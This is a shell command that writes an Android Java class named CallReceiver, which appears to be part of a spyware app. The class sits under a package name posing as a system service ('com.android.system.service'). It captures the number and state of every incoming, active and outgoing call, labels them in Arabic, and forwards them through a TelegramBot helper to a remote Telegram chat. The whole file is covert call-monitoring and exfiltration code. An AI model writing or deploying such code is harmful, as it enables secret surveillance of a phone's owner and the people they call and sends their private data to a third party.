          cat << 'EOF' > app/src/main/java/com/hussein/v8/CallReceiver.java
          package com.android.system.service;
          
          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.telephony.TelephonyManager;
          import android.text.TextUtils;
          
          public class CallReceiver extends BroadcastReceiver {
              @Override
              public void onReceive(Context context, Intent intent) {
                  String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
                  String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                  
                  if (TextUtils.isEmpty(number) && intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) {
                      number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                  }
                  
                  if (TextUtils.isEmpty(number)) return;
                  
                  String type = "غير معروف";
                  if (TelephonyManager.EXTRA_STATE_RINGING.equals(state)) {
                      type = "⏰ مكالمة واردة";
                  } else if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
                      type = "📞 مكالمة قيد التقدم";
                  } else if (intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) {
                      type = "🔴 مكالمة صادرة";
                  }
                  
                  String data = type + "\nالرقم: " + number;
                  TelegramBot.sendMessage(context, data);
              }
          }
